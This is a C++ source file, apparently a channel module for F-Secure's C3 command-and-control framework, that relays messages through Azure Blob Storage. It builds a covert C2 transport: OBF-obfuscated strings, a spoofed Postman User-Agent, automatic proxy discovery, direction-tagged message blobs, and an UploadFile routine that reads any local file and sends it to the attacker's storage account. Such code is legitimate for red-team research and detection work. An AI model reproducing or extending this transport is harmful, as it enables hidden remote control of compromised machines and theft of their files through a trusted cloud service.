#include "stdafx.h"
#include "AzureBlobStorageApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include "Common/rapidxml-1.13/rapidxml.hpp"
#include <random>
#include <cctype>
#include <algorithm>
#include <string>
#include <fstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;
using namespace rapidxml;

namespace
{
	std::wstring ToWideString(std::string const& str)
	{
		return Convert<Utf16>(str);
	}
}

FSecure::AzureBlobStorage::AzureBlobStorage(std::string const& sasToken, std::string const& storageAccountName, std::string const& containerName, std::string const& channelName)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	this->m_sasToken = sasToken;
	this->m_storageAccountName = storageAccountName;
	this->m_containerName = containerName;

	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });
	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::AzureBlobStorage::SetChannel(std::string const& channelName)
{
	this->m_Channel = channelName;
}

void FSecure::AzureBlobStorage::SetToken(std::string const& sasToken)
{
	this->m_sasToken = sasToken;
}

void FSecure::AzureBlobStorage::WriteMessageToFile(std::string const& direction, ByteView data, std::string const& providedFilename)
{
	//std::string url = OBF_STR("https://content.dropboxapi.com/2/files/upload");
	//std::cout << "Start of WriteMessageToFile\n";
	std::string filename;

	if (providedFilename == "")
	{
		// Create a filename thats prefixed with message direction and suffixed
		// with more granular timestamp for querying later
		std::string ts = std::to_string(FSecure::Utils::MillisecondsTimestamp());
		filename = direction + OBF("-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts;
	}
	else
		filename = providedFilename;
	// check if filename here needs an '/' added - probably doesn't
	std::string blobPath = OBF("/") + this->m_Channel + OBF("/") + filename + OBF("?");

	//json j;
	//j[OBF("path")] = OBF("/") + this->m_Channel + OBF("/") + filename;
	//j[OBF("mode")] = OBF("add");
	//j[OBF("autorename")] = false;
	//j[OBF("mute")] = true;
	//j[OBF("strict_conflict")] = true;
	//std::cout << "blobPath is: ";
	//std::cout << blobPath << std::endl;

	SendHttpRequest(blobPath, ContentType::ApplicationOctetstream, Method::PUT, data);
}



std::map<std::string, std::string> FSecure::AzureBlobStorage::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	xml_document<> doc;
	xml_node<>* root_node;
	//std::string url = OBF("https://AzureBlobStorage.com/api/conversations.list?exclude_archived=true");

	FSecure::ByteVector response = SendHttpRequest("?restype=container&comp=list&", ContentType::TextPlain, Method::GET);
	std::string stringResponse = { response.begin(), response.end() };
	//stringResponse.erase(std::remove(stringResponse.begin(), stringResponse.end(), 'ï'), stringResponse.end());
	//stringResponse.erase(std::remove(stringResponse.begin(), stringResponse.end(), '»'), stringResponse.end());
	//stringResponse.erase(std::remove(stringResponse.begin(), stringResponse.end(), '¿'), stringResponse.end()); // temp hack to get rid of bad chars, need to find out why they are there or if we need to do this
	
	doc.parse<0>(&stringResponse[0]); 
	root_node = doc.first_node("EnumerationResults");
	xml_node<>* blobsNode = doc.first_node("EnumerationResults")->first_node("Blobs");

	for (xml_node<>* singleBlobNode = blobsNode->first_node("Blob"); singleBlobNode; singleBlobNode = singleBlobNode->next_sibling())
	{
		std::string blobName;
		blobName = singleBlobNode->first_node("Name")->value();

		if (blobName.back() != '/')
		{
			continue; // blobName == a channelName iff it is a directory
		}

		blobName.erase(std::remove(blobName.begin(), blobName.end(), '/'),blobName.end()); // remove trailing '/' (probs a better way to do this)

		xml_node<>* propertiesNode = singleBlobNode->first_node("Properties"); 
		
		std::string blobId = propertiesNode->first_node("Etag")->value();
		

		channelMap.insert({ blobName, blobId }); // bit budget but will use the directory's ETag as channel ID

	}
	//for (auto& channel : response[OBF("channels")])
	//{
		//std::string cName = channel[OBF("name")];
		//if (cName == OBF("everyone"))
			//continue;

		//std::string cId = channel[OBF("id")].get<std::string>();
		//channelMap.insert({ cName, cId });
	//}

	return channelMap;
}



std::string FSecure::AzureBlobStorage::CreateChannel(std::string const& channelName)
{
	std::map<std::string, std::string> channels = this->ListChannels();
	std::string blobPath;
	std::string	errorMsg;
	std::vector<uint8_t> data;
	FSecure::ByteVector response;
	//FSecure::WinHttp::ContentType contentType;
	//json response;

	if (channels.find(channelName) == channels.end())
	{
		// is that if statement the right way around? should it be != ? 

		//url = OBF("https://") + accountName + OBF("blob.core.windows.net/") + containerName + OBF("/") + channelName + OBF("/");
		//contentType = FSecure::WinHttp::ContentType::TextPlain;
		//json j;
		//j[OBF("name")] = channelName;
		///j[OBF("auto_init")] = true;
		///j[OBF("private")] = true;
		
		blobPath = OBF("/") + channelName + OBF("/?");
		//response = SendJsonRequest(url, j, Method::POST);
		response = SendHttpRequest(blobPath, ContentType::TextPlain, Method::PUT);
		//response = SendHttpRequest(url,ContentType::TextPlain, data, Method::PUT);
		//if (response.contains(OBF("message"))) {
			//errorMsg = response[OBF("message")] + OBF("\n");
			//throw std::runtime_error(OBF("Throwing exception: unable to create channel - ") + errorMsg);
		//}
	}
	else
	{
		// do we want to delete channels that bear the channel name we're after?
		DeleteFile(channelName + "/");
		blobPath = OBF("/") + channelName + OBF("/?");
		response = SendHttpRequest(blobPath, ContentType::TextPlain, Method::PUT);
	}


	return channelName;
}


std::vector<std::string> FSecure::AzureBlobStorage::SplitBlobName(const std::string& blobName)
{
	char delimiter = '/';
	size_t i = blobName.rfind(delimiter, blobName.length());
	if (i != std::string::npos) {
		std::vector<std::string> splitName = {blobName.substr(0, i) , blobName.substr(i + 1, blobName.length() - i) };
		return splitName;
	}
	std::vector<std::string> splitName = {"",""};
	return(splitName);
}

FSecure::ByteVector FSecure::AzureBlobStorage::ReadFile(std::string const& filename)
{
	//std::cout << "Entering ReadFile\n";
	// check OctetStream
	std::string blobPath = OBF("/") + filename + OBF("?");
	FSecure::ByteVector response;

	response = SendHttpRequest(blobPath, ContentType::ApplicationOctetstream, Method::GET);
	return response;
}

void FSecure::AzureBlobStorage::DeleteFile(std::string const& filename)
{
	std::cout << "Entering DeleteFile\n";
	std::string blobPath = OBF("/") + filename + OBF("?");
	std::cout << blobPath + "\n";
	SendHttpRequest(blobPath, ContentType::ApplicationOctetstream, Method::DEL);
}

void FSecure::AzureBlobStorage::UploadFile(std::string const& path)
{
	//std::cout << "Entering UploadFile\n";
	std::filesystem::path filepathForUpload = path;
	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);

	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
	readFile.close();

	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;

	WriteMessageToFile("", packet, filename);
}

std::map<std::string, std::string> FSecure::AzureBlobStorage::GetMessagesByDirection(std::string const& direction)
{
	//std::cout << "Entered GetMessagesByDirection\n";
	std::map<std::string, std::string> messages;
	//json response;
	std::string cursor;

	xml_document<> doc;
	xml_node<>* root_node; 

	FSecure::ByteVector response = SendHttpRequest("?restype=container&comp=list&prefix=" + this->m_Channel + "&", ContentType::TextPlain, Method::GET);
	std::string stringResponse = { response.begin(), response.end() };

	doc.parse<0>(&stringResponse[0]);
	root_node = doc.first_node("EnumerationResults");
	xml_node<>* blobsNode = doc.first_node("EnumerationResults")->first_node("Blobs");
	// does this actually get hte message?
	//std::cout << "About to enter xml loop\n";
	for (xml_node<>* singleBlobNode = blobsNode->first_node("Blob"); singleBlobNode; singleBlobNode = singleBlobNode->next_sibling())
	{
		std::string blobName;
		blobName = singleBlobNode->first_node("Name")->value();

		if (blobName.back() == '/') // same as listing channels except this time we exclude for ending in '/'
		{
			continue; // blobName == a channelName iff it is a directory
		}

		//blobName.erase(std::remove(blobName.begin(), blobName.end(), '/'), blobName.end()); // remove trailing '/' (probs a better way to do this)

		//std::vector<std::string> splitName = SplitBlobName(blobName);

		if (blobName.find(direction) != std::string::npos) {
			std::string ts = blobName.substr(blobName.length() - 10); // 10 = epoch time length
			messages.insert({ ts, blobName });
			//std::cout << "ts is " + ts + "\n";
			//std::cout << "blobName is " + blobName + "\n";
			//ret.emplace_back(ts);
		}

		//xml_node<>* propertiesNode = singleBlobNode->first_node("Properties");

		//std::string blobId = propertiesNode->first_node("Etag")->value();


		//channelMap.insert({ blobName, blobId }); // bit budget but will use the directory's ETag as channel ID

	}
	//std::cout << direction;
	//std::cout << "hit return messages\n";
	return messages;
}




FSecure::ByteVector FSecure::AzureBlobStorage::SendHttpRequest(std::string const& blobPath, WinHttp::ContentType contentType, WinHttp::Method method, std::string const& data)
{
	//std::string stringContentType;
	//stringContentType = GetContentType(contentType);
	//std::cout << "Entering SendHttpRequest\n";
	std::string Url;
		while (true)
		{
			Url = OBF("https://") + this->m_storageAccountName + OBF(".blob.core.windows.net/") + this->m_containerName + blobPath + this->m_sasToken;
			//sasUrl = host + OBF("?") + this->m_sasToken; // append SAS auth token to URL
			HttpClient webClient(ToWideString(Url), m_ProxyConfig);
			HttpRequest request; // default request is GET

			request.m_Method = method; // removed from loop to support DELETE requests

			if (method == Method::PUT) // should add check that contentType isn't empty too
			{
				//request.m_Method = method;
				request.SetData(contentType, { data.begin(), data.end() });
				request.SetHeader(OBF(L"x-ms-blob-type"), OBF(L"BlockBlob"));
			}

			request.SetHeader(Header::UserAgent, ToWideString("PostmanRuntime/7.26.10"));
			//request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_sasToken));
			request.SetData(contentType, { data.begin(), data.end() });
			//std::cout << "About to call webClient.Request\n";
			auto resp = webClient.Request(request);
			//std::cout << "Did webClient.Request\n";

			if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Accepted || resp.GetStatusCode() == StatusCode::Created || resp.GetStatusCode() == StatusCode::NotFound) {
				//std::cout << "about to resp.GetData\n";
				return resp.GetData();
			}
			else if (resp.GetStatusCode() == StatusCode::TooManyRequests) {
				std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
			}
			else {
				//std::cout << resp.GetStatusCode();
				throw std::exception(OBF("[x] Non 200/201/202/429 HTTP Response\n"));
			}
		}
}

